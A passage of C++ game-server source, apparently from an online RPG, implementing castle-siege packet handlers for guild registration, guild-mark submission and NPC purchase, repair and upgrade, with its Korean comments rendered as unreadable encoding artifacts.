	// 2> . ��忡 �����ִ��� Ȯ��
	if (!strcmp(gObj[iIndex].GuildName, "")) {
		// �� ����� � ��忡�� �������� �ʴ�.
		GCAnsRegCastleSiege (iIndex, 6, "");
		return;
	}

	// 3> . �ڽ��� ����� �渶���� Ȯ���ϰ� ���ձ�� �϶��� ������ ���������� Ȯ��
	if (!g_CastleSiege.CheckUnionGuildMaster(iIndex)) {
		// ����
		GCAnsRegCastleSiege (iIndex, 0, "");
		return;
	}
	
	// 4> . ������ ����� �Ͽ����� Ȯ��
	if (g_CastleSiege.CheckCastleOwnerMember(iIndex) ||
		g_CastleSiege.CheckCastleOwnerUnionMember(iIndex)
		)
	{
		// ������ ��� Ȥ�� �� ���� ����̴�.
		GCAnsRegCastleSiege (iIndex, 3, "");
		return;
	}


	// GD [0x80][0x0D] ������ ����� ������ ��� ��û
	GS_GDReqRegAttackGuild (g_MapServerManager.GetMapSvrGroup(), iIndex);

#endif
}


//----------------------------------------------------------------------------
// GC [0xB2][0x01] ������ ����� ��û ����
//----------------------------------------------------------------------------
void GCAnsRegCastleSiege		(INT iIndex, INT iResult, LPSTR lpszGuildName)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111
	
	if (!lpszGuildName)
		return;	
	
	if (!CHECK_LIMIT(iIndex, MAX_OBJECT)) {
		return;
	}

	PMSG_ANS_REGCASTLESIEGE pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x01, sizeof(PMSG_ANS_REGCASTLESIEGE));
	pMsgResult.btResult				= iResult;

	memcpy(pMsgResult.szGuildName, lpszGuildName, 8);

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
	
	// #LOGADD_CASTLESIEGE_20050404 (b4nfter)
	if (gObjIsConnected(iIndex)) {
		LogAddTD("[CastleSiege] [%s][%s] Registered Castle Siege (GUILD:%s) - Result:%d",
			gObj[iIndex].AccountID,
			gObj[iIndex].Name,
			gObj[iIndex].GuildName,
			iResult
			);
	}
#endif
}


//----------------------------------------------------------------------------
// CG [0xB2][0x02] ������ ���⸦ ��û
//----------------------------------------------------------------------------
void CGReqGiveUpCastleSiege		(LPPMSG_REQ_GIVEUPCASTLESIEGE lpMsg, INT iIndex)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111
	
	// 1> . ���簡 ���� ������ �ð����� Ȯ��
	if (g_CastleSiege.GetCastleState() < CASTLESIEGE_STATE_REGSIEGE || g_CastleSiege.GetCastleState() > CASTLESIEGE_STATE_REGMARK) {

#ifdef MODIFY_ANS_GIVEUP_20050413
		GCAnsGiveUpCastleSiege( iIndex, 3, FALSE, 0, "");
#else
		// ���� ������ �ð��� �ƴ�
		GCAnsRegCastleSiege (iIndex, 3, "");
#endif
		return;
	}
	
	// 2> . ��忡 �����ִ��� Ȯ��
	if (!strcmp(gObj[iIndex].GuildName, "")) {
		// �� ����� � ��忡�� �������� �ʴ�.
		return;
	}

	// 3> . �ڽ��� ����� �渶���� Ȯ���ϰ� ���ձ�� �϶��� ������ ���������� Ȯ��
	if (!g_CastleSiege.CheckUnionGuildMaster(iIndex)) {
		return;
	}
	
	// GD [0x80][0x12] ������ Ư�� ��� ��� ���� ���⿩�� ���� ��û
	GS_GDReqGuildSetGiveUp (g_MapServerManager.GetMapSvrGroup(), iIndex, lpMsg->btGiveUp);

#endif
}


//----------------------------------------------------------------------------
// GC [0xB2][0x02] ������ ���⸦ ��û ����
//----------------------------------------------------------------------------
void GCAnsGiveUpCastleSiege		(INT iIndex, INT iResult, BOOL bGiveUp, INT iMarkCount, LPSTR lpszGuildName)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111

	if (!lpszGuildName)
		return;	

	if (!CHECK_LIMIT(iIndex, MAX_OBJECT)) {
		return;
	}

	PMSG_ANS_GIVEUPCASTLESIEGE pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x02, sizeof(PMSG_ANS_GIVEUPCASTLESIEGE));
	pMsgResult.btResult				= iResult;

	pMsgResult.btIsGiveUp			= (BYTE) bGiveUp;
	memcpy(pMsgResult.szGuildName, lpszGuildName, 8);

	if (pMsgResult.btResult == 1) {
		// �����ߴٸ� ���⼭ ������ ǥ���� ������ ��ȯ���ش�.
		if (iMarkCount > 0) {
			gObj[iIndex].Money += iMarkCount * CS_MARK_GIVEUP_MONEY;
#ifdef MODIFY_ZEN_MAX_20040414
			if (gObj[iIndex].Money > MAX_ZEN) {
				gObj[iIndex].Money = MAX_ZEN;
			}
#endif
			GCMoneySend(iIndex, gObj[iIndex].Money);
		}
	}

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);

	// #LOGADD_CASTLESIEGE_20050404 (b4nfter)
	if (gObjIsConnected(iIndex)) {
		LogAddTD("[CastleSiege] [%s][%s] GiveUp Castle Siege (GUILD:%s) - Result:%d",
			gObj[iIndex].AccountID,
			gObj[iIndex].Name,
			gObj[iIndex].GuildName,
			iResult
			);
	}
#endif
}


//----------------------------------------------------------------------------
// CG [0xB2][0x03] �ڽ��� ����� ������Ͽ� ���� ������ ��û
//----------------------------------------------------------------------------
void CGReqGuildRegInfo			(LPPMSG_REQ_GUILDREGINFO lpMsg, INT iIndex)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111

	if (lpMsg == NULL)
		return;
	
	// 1> . ��忡 �����ִ��� Ȯ��
	if (!strcmp(gObj[iIndex].GuildName, "")) {
		// �� ����� � ��忡�� �������� �ʴ�.
		return;
	}
	
	// GD [0x80][0x0A] ������ Ư�� ��� ��� ���� ��û
	GS_GDReqGuildMarkRegInfo (g_MapServerManager.GetMapSvrGroup(), iIndex);

#endif
}


//----------------------------------------------------------------------------
// GC [0xB2][0x03] �ڽ��� ����� ������Ͽ� ���� ������ ��û ����
//----------------------------------------------------------------------------
void GCAnsGuildRegInfo			(INT iIndex, INT iResult, LPCSP_ANS_GUILDREGINFO lpMsgResult)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111
	
	if(lpMsgResult == NULL)
		return;

	if (!CHECK_LIMIT(iIndex, MAX_OBJECT)) {
		return;
	}

	PMSG_ANS_GUILDREGINFO pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x03, sizeof(PMSG_ANS_GUILDREGINFO));
	pMsgResult.btResult				= iResult;

	pMsgResult.btGuildMark1			= HIBYTE(HIWORD(lpMsgResult->iRegMarkCount));
	pMsgResult.btGuildMark2			= LOBYTE(HIWORD(lpMsgResult->iRegMarkCount));
	pMsgResult.btGuildMark3			= HIBYTE(LOWORD(lpMsgResult->iRegMarkCount));
	pMsgResult.btGuildMark4			= LOBYTE(LOWORD(lpMsgResult->iRegMarkCount));
	pMsgResult.btRegRank			= lpMsgResult->btRegRank;
	pMsgResult.btIsGiveUp			= lpMsgResult->bIsGiveUp;
	memcpy(pMsgResult.szGuildName, lpMsgResult->szGuildName, 8);

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);

#endif
}


//----------------------------------------------------------------------------
// CG [0xB2][0x04] �ڽ��� ����� ������ ǥ�� ��� ��û
//----------------------------------------------------------------------------
void CGReqRegGuildMark			(LPPMSG_REQ_REGGUILDMARK lpMsg, INT iIndex)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111

	if (lpMsg == NULL)
		return;

	if( !CHECK_LIMIT(iIndex, MAX_OBJECT) ) 
	{
		return;
	}

	if (gObj[iIndex].UseEventServer == TRUE) {
		return;
	}

	gObj[iIndex].UseEventServer = TRUE;
	
	// 1> . ������ ǥ�� ��ϱⰣ���� Ȯ��
	if (g_CastleSiege.GetCastleState() != CASTLESIEGE_STATE_REGMARK) {
		// ��ϱⰣ ���Ŀ��� ����� �� ����.
		gObj[iIndex].UseEventServer = FALSE;
		return;
	}

	// 2> . ��忡 �����ִ��� Ȯ��
	if (!strcmp(gObj[iIndex].GuildName, "")) {
		// �� ����� � ��忡�� �������� �ʴ�.
		gObj[iIndex].UseEventServer = FALSE;
		return;
	}

	// 3> . ���� �κ��丮 ��ġ�� ���� ������ ǥ�� �������� ������ �ִ��� Ȯ��
	if (!CHECK_LIMIT(lpMsg->btItemPos, MAX_INVENTORYMAP)) {
		PMSG_ANS_REGGUILDMARK pMsgResult = {0,};
		pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x04, sizeof(PMSG_ANS_REGGUILDMARK));
		pMsgResult.btResult				= 3;
		DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);

		gObj[iIndex].UseEventServer = FALSE;
		return;
	}

	INT iItemPos	= lpMsg->btItemPos + MAX_EQUIPMENT;
	if (!gObj[iIndex].pInventory[iItemPos].IsItem()) {
		PMSG_ANS_REGGUILDMARK pMsgResult = {0,};
		pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x04, sizeof(PMSG_ANS_REGGUILDMARK));
		pMsgResult.btResult				= 3;
		DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);

		gObj[iIndex].UseEventServer = FALSE;
		return;
	}

	// ������ ǥ�� üũ
	if (!(gObj[iIndex].pInventory[iItemPos].m_Type == MAKE_ITEMNUM(14, 21) &&
		gObj[iIndex].pInventory[iItemPos].m_Level == 3) ||
		(gObj[iIndex].pInventory[iItemPos].m_Durability <= 0)
		)
	{
		PMSG_ANS_REGGUILDMARK pMsgResult = {0,};
		pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x04, sizeof(PMSG_ANS_REGGUILDMARK));
		pMsgResult.btResult				= 3;
		DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
		
		gObj[iIndex].UseEventServer = FALSE;
		return;
	}

	// GD [0x80][0x10] ������ Ư�� ��� ��� ��ũ ��� ��û (0xC1)
	GS_GDReqRegGuildMark (g_MapServerManager.GetMapSvrGroup(), iIndex, iItemPos);

#endif
}


//----------------------------------------------------------------------------
// GC [0xB2][0x04] �ڽ��� ����� ������ ǥ�� ��� ��û ����
//----------------------------------------------------------------------------
void GCAnsRegGuildMark			(INT iIndex, INT iResult, LPCSP_ANS_GUILDREGMARK lpMsgResult)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111

	if(lpMsgResult == NULL)
		return;

	if (!CHECK_LIMIT(iIndex, MAX_OBJECT)) {
		return;
	}

	if (!gObj[iIndex].pInventory[lpMsgResult->iItemPos].IsItem()) {
		PMSG_ANS_REGGUILDMARK pMsgResult = {0,};
		pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x04, sizeof(PMSG_ANS_REGGUILDMARK));
		pMsgResult.btResult				= 3;
		DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);

		gObj[iIndex].UseEventServer = FALSE;
		return;
	}

	// ������ ǥ�� �谨
	if ((gObj[iIndex].pInventory[lpMsgResult->iItemPos].m_Type != MAKE_ITEMNUM(14, 21) && 
		gObj[iIndex].pInventory[lpMsgResult->iItemPos].m_Level == 3) ||
		gObj[iIndex].pInventory[lpMsgResult->iItemPos].m_Durability <= 0
		)
	{
		PMSG_ANS_REGGUILDMARK pMsgResult = {0,};
		pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x04, sizeof(PMSG_ANS_REGGUILDMARK));
		pMsgResult.btResult				= 3;
		DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
		
		gObj[iIndex].UseEventServer = FALSE;
		return;
	}

	gObj[iIndex].pInventory[lpMsgResult->iItemPos].m_Durability --;

	if (gObj[iIndex].pInventory[lpMsgResult->iItemPos].m_Durability > 0) {
		GCItemDurSend(iIndex, lpMsgResult->iItemPos, gObj[iIndex].pInventory[lpMsgResult->iItemPos].m_Durability, 0);
	}
	else {
		gObjInventoryDeleteItem(iIndex, lpMsgResult->iItemPos);
		GCInventoryItemDeleteSend(iIndex, lpMsgResult->iItemPos, 1);
	}
	
	PMSG_ANS_REGGUILDMARK pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x04, sizeof(PMSG_ANS_REGGUILDMARK));
	pMsgResult.btResult				= iResult;

	pMsgResult.btGuildMark1			= HIBYTE(HIWORD(lpMsgResult->iRegMarkCount));
	pMsgResult.btGuildMark2			= LOBYTE(HIWORD(lpMsgResult->iRegMarkCount));
	pMsgResult.btGuildMark3			= HIBYTE(LOWORD(lpMsgResult->iRegMarkCount));
	pMsgResult.btGuildMark4			= LOBYTE(LOWORD(lpMsgResult->iRegMarkCount));
	memcpy(pMsgResult.szGuildName, lpMsgResult->szGuildName, 8);

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);

	gObj[iIndex].UseEventServer = FALSE;

#endif
}


//----------------------------------------------------------------------------
// CG [0xB2][0x05] ������ NPC ���� ��û -> ����üũ, �������� ����
//----------------------------------------------------------------------------
void CGReqNpcBuy				(LPPMSG_REQ_NPCBUY lpMsg, INT iIndex)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111
	
	if(lpMsg == NULL)
		return;

	if (!gObjIsConnected(iIndex))
		return;

	// ��忡 ���ԵǾ����� �ʴٸ� �����Ѵ�.
	if (!strcmp(gObj[iIndex].GuildName, ""))
		return;

	// �ʿ��ϴٸ� ��û���� ������ üũ�Ѵ�. (������ Ư�� ������ �ƴ϶�� �Ұ�)
	if (g_CastleSiege.CheckGuildOwnCastle(gObj[iIndex].GuildName) == FALSE || 
		(gObj[iIndex].GuildStatus != G_MASTER && gObj[iIndex].GuildStatus != G_SUB_MASTER)
		) 
	{
		LogAddC(LOGC_RED,"[CastleSiege] CGReqNpcBuy() ERROR - Authority Fail [%s][%s], Guild:(%s)(%d), Npc:(CLS:%d, IDX:%d)",
			gObj[iIndex].AccountID,
			gObj[iIndex].Name,
			gObj[iIndex].GuildName,
			gObj[iIndex].GuildStatus,
			lpMsg->iNpcNumber,
			lpMsg->iNpcIndex
			);
		return;
	}

	BYTE btResult	= 0;
	BOOL bRETVAL	= g_CastleSiege.CheckAddDbNPC(iIndex, lpMsg->iNpcNumber, lpMsg->iNpcIndex, btResult);
	if (bRETVAL == FALSE) {
		// NPC ���ſ� �����ߴٰ� �˸���.
		GCAnsNpcBuy (iIndex, btResult, lpMsg->iNpcNumber, lpMsg->iNpcIndex);
		LogAddC(LOGC_RED,"[CastleSiege] CGReqNpcBuy() ERROR - CCastleSiege::CheckAddDbNPC() [%s][%s], Guild:(%s)(%d), Npc:(CLS:%d, IDX:%d)",
			gObj[iIndex].AccountID,
			gObj[iIndex].Name,
			gObj[iIndex].GuildName,
			gObj[iIndex].GuildStatus,
			lpMsg->iNpcNumber,
			lpMsg->iNpcIndex
			);
	}
	else {
		LogAddC(LOGC_RED,"[CastleSiege] CGReqNpcBuy() OK - [%s][%s], Guild:(%s)(%d), Npc:(CLS:%d, IDX:%d)",
			gObj[iIndex].AccountID,
			gObj[iIndex].Name,
			gObj[iIndex].GuildName,
			gObj[iIndex].GuildStatus,
			lpMsg->iNpcNumber,
			lpMsg->iNpcIndex
			);
	}
	
#endif
}


//----------------------------------------------------------------------------
// GC [0xB2][0x05] ������ NPC ���� ��û ����
//----------------------------------------------------------------------------
void GCAnsNpcBuy				(INT iIndex, INT iResult, INT iNpcNumber, INT iNpcIndex)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111
	
	PMSG_ANS_NPCBUY pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x05, sizeof(PMSG_ANS_NPCBUY));
	pMsgResult.btResult		= (BYTE) iResult;
	pMsgResult.iNpcNumber		= iNpcNumber;
	pMsgResult.iNpcIndex		= iNpcIndex;

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);

#endif
}


//----------------------------------------------------------------------------
// CG [0xB2][0x06] ������ NPC ���� ��û -> ����üũ, �������� ����
//----------------------------------------------------------------------------
void CGReqNpcRepair				(LPPMSG_REQ_NPCREPAIR lpMsg, INT iIndex)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111

	if(lpMsg == NULL)
		return;
	
	if (!gObjIsConnected(iIndex))
		return;

	// ��忡 ���ԵǾ����� �ʴٸ� �����Ѵ�.
	if (!strcmp(gObj[iIndex].GuildName, ""))
		return;

	// �ʿ��ϴٸ� ��û���� ������ üũ�Ѵ�. (������ Ư�� ������ �ƴ϶�� �Ұ�)
	if (g_CastleSiege.CheckGuildOwnCastle(gObj[iIndex].GuildName) == FALSE || 
		(gObj[iIndex].GuildStatus != G_MASTER && gObj[iIndex].GuildStatus != G_SUB_MASTER)
		) 
	{
		LogAddC(LOGC_RED,"[CastleSiege] CGReqNpcRepair() ERROR - Authority Fail [%s][%s], Guild:(%s)(%d)",
			gObj[iIndex].AccountID,
			gObj[iIndex].Name,
			gObj[iIndex].GuildName,
			gObj[iIndex].GuildStatus
			);
		return;
	}

	// �ش� NPC�� ������ �����ϴ��� Ȯ���Ѵ�. -> ������ ����
	CS_NPC_DATA pNpcData;
	BOOL bRETVAL	= g_CastleSiege.GetNpcData(lpMsg->iNpcNumber, lpMsg->iNpcIndex, pNpcData);
	if (bRETVAL == FALSE) {
		GCAnsNpcRepair (iIndex, 0, lpMsg->iNpcNumber, lpMsg->iNpcIndex, 0, 0);
		LogAddC(LOGC_RED,"[CastleSiege] CGReqNpcRepair() ERROR - CL Request Fail [%s][%s], Guild:(%s)(%d), Npc:(CLS:%d, IDX:%d)",
			gObj[iIndex].AccountID,
			gObj[iIndex].Name,
			gObj[iIndex].GuildName,
			gObj[iIndex].GuildStatus,
			lpMsg->iNpcNumber,
			lpMsg->iNpcIndex
			);
		return;
	}

	INT iNpcIndex	= pNpcData.m_iNPC_OBJINDEX;
	if (!gObjIsConnected(iNpcIndex)) {
		GCAnsNpcRepair (iIndex, 0, lpMsg->iNpcNumber, lpMsg->iNpcIndex, 0, 0);
		LogAddC(LOGC_RED,"[CastleSiege] CGReqNpcRepair() ERROR - Npc Alive Data Mismatch [%s][%s], Guild:(%s)(%d), Npc:(CLS:%d, IDX:%d)",
			gObj[iIndex].AccountID,
			gObj[iIndex].Name,
			gObj[iIndex].GuildName,
			gObj[iIndex].GuildStatus,
			pNpcData.m_iNPC_NUM,
			pNpcData.m_iNPC_INDEX
			);
		return;
	}
	else if (gObj[iNpcIndex].Live == 0) {
		GCAnsNpcRepair (iIndex, 0, lpMsg->iNpcNumber, lpMsg->iNpcIndex, 0, 0);
		LogAddC(LOGC_RED,"[CastleSiege] CGReqNpcRepair() ERROR - Npc Alive Data Mismatch [%s][%s], Guild:(%s)(%d), Npc:(CLS:%d, IDX:%d)",
			gObj[iIndex].AccountID,
			gObj[iIndex].Name,
			gObj[iIndex].GuildName,
			gObj[iIndex].GuildStatus,
			pNpcData.m_iNPC_NUM,
			pNpcData.m_iNPC_INDEX
			);
		return;
	}

	// ������ �ʿ䰡 �ִ��� Ȯ���Ѵ�.
	if ((gObj[iNpcIndex].MaxLife == gObj[iNpcIndex].Life) ||
		(gObj[iNpcIndex].MaxLife < gObj[iNpcIndex].Life)
		) 
	{
		gObj[iNpcIndex].Life	= gObj[iNpcIndex].MaxLife;
		GCAnsNpcRepair (iIndex, 0, lpMsg->iNpcNumber, lpMsg->iNpcIndex, 0, 0);
		return;
	}

	// ��������� ����Ѵ�.
	INT iRepairCost	= 0;
	switch(lpMsg->iNpcNumber) {
	case 277 :	// ����
		iRepairCost	= (gObj[iNpcIndex].MaxLife - gObj[iNpcIndex].Life) * 5 + gObj[iNpcIndex].m_btCsNpcDfLevel * 1000000;
		break;
	case 283 :	// ��ȣ����
		iRepairCost	= (gObj[iNpcIndex].MaxLife - gObj[iNpcIndex].Life) * 3 + (gObj[iNpcIndex].m_btCsNpcDfLevel + gObj[iNpcIndex].m_btCsNpcRgLevel)* 1000000;
		break;
	default :	// �� �� ? -> ����
		GCAnsNpcRepair (iIndex, 0, lpMsg->iNpcNumber, lpMsg->iNpcIndex, 0, 0);
		return;
		break;
	}

	// ��������� �ִ��� Ȯ���Ѵ�. -> ������� �谨�� ���� ���� �Ŀ� ��
	if (gObj[iIndex].Money < iRepairCost) {
		GCAnsNpcRepair (iIndex, 3, lpMsg->iNpcNumber, lpMsg->iNpcIndex, 0, 0);
		LogAddC(LOGC_RED,"[CastleSiege] CGReqNpcRepair() ERROR - Money isn't enough [%s][%s], Guild:(%s)(%d), Npc:(CLS:%d, IDX:%d)",
			gObj[iIndex].AccountID,
			gObj[iIndex].Name,
			gObj[iIndex].GuildName,
			gObj[iIndex].GuildStatus,
			pNpcData.m_iNPC_NUM,
			pNpcData.m_iNPC_INDEX
			);
		return;
	}
	else {
		LogAddC(LOGC_RED,"[CastleSiege] CGReqNpcRepair() OK - [%s][%s], Guild:(%s)(%d), Npc:(CLS:%d, IDX:%d)",
			gObj[iIndex].AccountID,
			gObj[iIndex].Name,
			gObj[iIndex].GuildName,
			gObj[iIndex].GuildStatus,
			pNpcData.m_iNPC_NUM,
			pNpcData.m_iNPC_INDEX
			);
	}
		
	GS_GDReqCastleNpcRepair (g_MapServerManager.GetMapSvrGroup(), iIndex, lpMsg->iNpcNumber, lpMsg->iNpcIndex, iRepairCost);

#endif
}


//----------------------------------------------------------------------------
// GC [0xB2][0x06] ������ NPC ���� ��û ����
//----------------------------------------------------------------------------
void GCAnsNpcRepair				(INT iIndex, INT iResult, INT iNpcNumber, INT iNpcIndex, INT iNpcHP, INT iNpcMaxHP)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111

	PMSG_ANS_NPCREPAIR pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x06, sizeof(PMSG_ANS_NPCREPAIR));
	pMsgResult.btResult			= (BYTE) iResult;
	pMsgResult.iNpcNumber		= iNpcNumber;
	pMsgResult.iNpcIndex		= iNpcIndex;
	pMsgResult.iNpcHP			= iNpcHP;
	pMsgResult.iNpcMaxHP		= iNpcMaxHP;

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);

#endif
}

	
//----------------------------------------------------------------------------
// CG [0xB2][0x07] ������ NPC ���׷��̵� ��û -> ����üũ, �������� ����
//----------------------------------------------------------------------------
void CGReqNpcUpgrade				(LPPMSG_REQ_NPCUPGRADE lpMsg, INT iIndex)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111
	
	if(lpMsg == NULL)
		return;
	if(!gObjIsConnected(iIndex))
		return;

	INT iNEED_GEMOFDEFEND	= 0;		// �ʿ��� ��ȣ����
	INT iNEED_MONEY			= 0;		// �ʿ��� ��
	INT iCUR_UPLVL			= 0;		// ������ ���׷��̵� ����
	INT iNXT_UPLVL			= 0;		// ����� ���׷��̵� ����
	INT iNXT_UPVALUE		= 0;		// ����� ���׷��̵� ��ġ
	BOOL bENABLE_UPGRADE	= FALSE;	// ���׷��̵� �������� ���� (���üũ ��������)
	
	// ��忡 ���ԵǾ����� �ʴٸ� �����Ѵ�.
	if (!strcmp(gObj[iIndex].GuildName, ""))
		return;

	// �ʿ��ϴٸ� ��û���� ������ üũ�Ѵ�. (������ Ư�� ������ �ƴ϶�� �Ұ�)
	if (g_CastleSiege.CheckGuildOwnCastle(gObj[iIndex].GuildName) == FALSE || gObj[iIndex].GuildStatus != G_MASTER) {
		LogAddTD("[CastleSiege] CGReqNpcUpgrade() ERROR - Authority Fail [%s][%s], Guild:(%s)(%d)",
			gObj[iIndex].AccountID,
			gObj[iIndex].Name,
			gObj[iIndex].GuildName,
			gObj[iIndex].GuildStatus
			);
		return;
	}

	// ���׷��̵� ������ NPC���� Ȯ���Ѵ�.
	switch(lpMsg->iNpcNumber) {
	case 277 :		// ����
		{
			// ���� �ش� NPC�� ����ִ��� Ȯ���Ѵ�.
			CS_NPC_DATA pNpcData;
			BOOL bIsLive	= g_CastleSiege.GetNpcData(lpMsg->iNpcNumber, lpMsg->iNpcIndex, pNpcData);
			if (bIsLive) {
				// ���׷��̵� �ϰ��� �ϴ� ������ �ش� �ܰ谡 �����ϴ��� �����Ѵ�.
				switch(lpMsg->iNpcUpType) {
				case CS_UPGRADE_TYPE_DEFENSE :			// ���׷��̵� - ����
					{
						// ���׷��̵忡 ���� ��ȿ���� �˻��Ѵ�.
						iCUR_UPLVL				= pNpcData.m_iNPC_DF_LEVEL;
						iNXT_UPLVL				= lpMsg->iNpcUpValue;
						if (iNXT_UPLVL >= 1 && iNXT_UPLVL <= MAX_UPGRADE_LEVEL && iNXT_UPLVL == iCUR_UPLVL+1) {
							// �� ���� ���� ������ ��� ��ȿ��
							bENABLE_UPGRADE		= TRUE;
							iNXT_UPVALUE		= iNXT_UPLVL;
							iNEED_GEMOFDEFEND	= g_iNpcUpDfLevel_CGATE[iNXT_UPLVL-1][1];
							iNEED_MONEY			= g_iNpcUpDfLevel_CGATE[iNXT_UPLVL-1][2];
						}	
					}
					break;
				case CS_UPGRADE_TYPE_MAXHITPOINT :		// ���׷��̵� - �ִ�HP
					{
						// ������ HP�� ��ܰ����� Ȯ�� -> ������ HP���� ���Ǻ񱳷� Ư�� ������ ������Ŵ
						iCUR_UPLVL				= 0;
						INT iLV;
						for(iLV = 0 ; iLV < MAX_UPGRADE_LEVEL ; iLV++) {
							if (pNpcData.m_iNPC_MAXHP >= g_iNpcUpMaxHP_CGATE[iLV][0]) {
								iCUR_UPLVL = iLV+1;
							}
						}
						iNXT_UPLVL				= 0;
						for(iLV = 0 ; iLV < MAX_UPGRADE_LEVEL ; iLV++) {
							if (lpMsg->iNpcUpValue >= g_iNpcUpMaxHP_CGATE[iLV][0]) {
								iNXT_UPLVL = iLV+1;
							}
						}
						if (iNXT_UPLVL >= 1 && iNXT_UPLVL <= MAX_UPGRADE_LEVEL && iNXT_UPLVL == iCUR_UPLVL+1) {
							// �� ���� ���� ������ ��� ��ȿ��
							bENABLE_UPGRADE		= TRUE;
							iNXT_UPVALUE		= g_iNpcUpMaxHP_CGATE[iNXT_UPLVL-1][0];
							iNEED_GEMOFDEFEND	= g_iNpcUpMaxHP_CGATE[iNXT_UPLVL-1][1];
							iNEED_MONEY			= g_iNpcUpMaxHP_CGATE[iNXT_UPLVL-1][2];
						}
					}
					break;
				default :
					{
						// �ش� Ÿ���� ���� - ����
						GCAnsNpcUpgrade (iIndex, 5, lpMsg->iNpcNumber, lpMsg->iNpcIndex, lpMsg->iNpcUpType, lpMsg->iNpcUpValue);
						return;
					}
					break;
				}
			}
			else {
				// NPC�� �������� �ʴ´� - ����
				GCAnsNpcUpgrade (iIndex, 7, lpMsg->iNpcNumber, lpMsg->iNpcIndex, lpMsg->iNpcUpType, lpMsg->iNpcUpValue);
				return;
			}
		}
		break;
	case 283 :		// ��ȣ����
		{
			// ���� �ش� NPC�� ����ִ��� Ȯ���Ѵ�.
			CS_NPC_DATA pNpcData;
			BOOL bIsLive	= g_CastleSiege.GetNpcData(lpMsg->iNpcNumber, lpMsg->iNpcIndex, pNpcData);
			if (bIsLive) {
				// ���׷��̵� �ϰ��� �ϴ� ������ �ش� �ܰ谡 �����ϴ��� �����Ѵ�.
				switch(lpMsg->iNpcUpType) {
				case CS_UPGRADE_TYPE_DEFENSE :			// ���׷��̵� - ����
					{
						// ���׷��̵忡 ���� ��ȿ���� �˻��Ѵ�.
						iCUR_UPLVL				= pNpcData.m_iNPC_DF_LEVEL;
						iNXT_UPLVL				= lpMsg->iNpcUpValue;
						if (iNXT_UPLVL >= 1 && iNXT_UPLVL <= MAX_UPGRADE_LEVEL && iNXT_UPLVL == iCUR_UPLVL+1) {
							// �� ���� ���� ������ ��� ��ȿ��
							bENABLE_UPGRADE		= TRUE;
							iNXT_UPVALUE		= iNXT_UPLVL;
							iNEED_GEMOFDEFEND	= g_iNpcUpDfLevel_CSTATUE[iNXT_UPLVL-1][1];
							iNEED_MONEY			= g_iNpcUpDfLevel_CSTATUE[iNXT_UPLVL-1][2];
						}
					}
					break;
				case CS_UPGRADE_TYPE_REGENARATION :		// ���׷��̵� - ȸ����
					{
						// ���׷��̵忡 ���� ��ȿ���� �˻��Ѵ�.
						iCUR_UPLVL				= pNpcData.m_iNPC_RG_LEVEL;
						iNXT_UPLVL				= lpMsg->iNpcUpValue;
						if (iNXT_UPLVL >= 1 && iNXT_UPLVL <= MAX_UPGRADE_LEVEL && iNXT_UPLVL == iCUR_UPLVL+1) {
							// �� ���� ���� ������ ��� ��ȿ��
							bENABLE_UPGRADE		= TRUE;
							iNXT_UPVALUE		= iNXT_UPLVL;
							iNEED_GEMOFDEFEND	= g_iNpcUpRgLevel_CSTATUE[iNXT_UPLVL-1][1];
							iNEED_MONEY			= g_iNpcUpRgLevel_CSTATUE[iNXT_UPLVL-1][2];
						}
					}
					break;
				case CS_UPGRADE_TYPE_MAXHITPOINT :		// ���׷��̵� - �ִ�HP
					{
						// ������ HP�� ��ܰ����� Ȯ�� -> ������ HP���� ���Ǻ񱳷� Ư�� ������ ������Ŵ
						iCUR_UPLVL				= 0;

						INT iLV;

						for(iLV = 0 ; iLV < MAX_UPGRADE_LEVEL ; iLV++) {
							if (pNpcData.m_iNPC_MAXHP >= g_iNpcUpMaxHP_CSTATUE[iLV][0]) {
								iCUR_UPLVL = iLV+1;
							}
						}
						iNXT_UPLVL				= 0;
						for(iLV = 0 ; iLV < MAX_UPGRADE_LEVEL ; iLV++) {
							if (lpMsg->iNpcUpValue >= g_iNpcUpMaxHP_CSTATUE[iLV][0]) {
								iNXT_UPLVL = iLV+1;
							}
						}
						if (iNXT_UPLVL >= 1 && iNXT_UPLVL <= MAX_UPGRADE_LEVEL && iNXT_UPLVL == iCUR_UPLVL+1) {
							// �� ���� ���� ������ ��� ��ȿ��
							bENABLE_UPGRADE		= TRUE;
							iNXT_UPVALUE		= g_iNpcUpMaxHP_CSTATUE[iNXT_UPLVL-1][0];
